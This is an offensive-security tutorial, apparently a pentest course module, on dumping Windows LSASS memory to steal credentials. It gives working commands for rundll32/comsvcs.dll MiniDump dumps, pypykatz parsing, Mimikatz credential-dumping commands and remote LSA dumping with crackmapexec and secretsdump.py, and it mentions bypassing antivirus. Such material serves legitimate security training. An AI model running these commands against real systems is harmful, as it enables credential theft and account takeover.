# Attacking LSA
## Dumping LSASS Process Memory
Similar to the process of attacking the SAM database, with LSASS, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump. Let's cover techniques that can be performed using tools already built-in to Windows.

### Task Manager Method
Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
A file called lsass.DMP is created and saved in: 
`C:\Users\loggedonusersdirectory\AppData\Local\Temp`

### Rundll32.exe & Comsvcs.dll Method
The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called rundll32.exe. This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.

Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to lsass.exe. This can be done from cmd or PowerShell:

#### Finding LSASS PID in cmd
```
# find lsass.exe and its process ID in the PID field.
> tasklist /svc
```

#### Finding LSASS PID in PowerShell
```powershell
# see the process ID in the Id field
Get-Process lsass
```

#### Creating lsass.dmp using PowerShell
Once we have the PID assigned to the LSASS process, we can create the dump file.
With an elevated PowerShell session, we can issue the following command to create the dump file:
```powershell
PS > rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\lsass.dmp). Recall that most modern AV tools recognize this as malicious and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.

If we manage to run this command and generate the lsass.dmp file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.

### Dumping Hashes Offline
Once we have the dump file on our attack host, we can use a powerful tool called pypykatz to attempt to extract credentials from the .dmp file. Pypykatz is an implementation of Mimikatz written entirely in Python. The fact that it is written in Python allows us to run it on Linux-based attack hosts. At the time of this writing, Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack host or we would need to run Mimikatz directly on the target, which is not an ideal scenario. This makes Pypykatz an appealing alternative because all we need is a copy of the dump file, and we can run it offline from our Linux-based attack host.

Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. Let's run Pypykatz against the dump file and find out.
Running Pypykatz

The command initiates the use of pypykatz to parse the secrets hidden in the LSASS process memory dump. We use lsa in the command because LSASS is a subsystem of local security authority, then we specify the data source as a minidump file, proceeded by the path to the dump file (/home/peter/Documents/lsass.dmp) stored on our attack host. Pypykatz parses the dump file and outputs the findings:

```bash
$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp`
```

### Mimikatz
```bash
mimikatz > privilege::debug
mimikatz > token::elevate

#Dump LSASS:
mimikatz > sekurlsa::logonpasswords

#Dump and save LSASS in a file
mimikatz > sekurlsa::minidump c:\temp\lsass.dmp

# Dump LSA
mimikatz > lsadump::secrets
```

### Dumping Hashes Remote
```bash
$ crackmapexec smb <IP/RANGE> --local-auth -u <USERNAME> -p <PASSWORD> --lsa
$ crackmapexec smb <IP/RANGE> -u <USERNAME> -p <PASSWORD> --lsa
$ secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<IP> 
```

### Cracking Hashes with Hashcat
Check [Brute Force](../BruteForce/BruteForce.md#hashcat)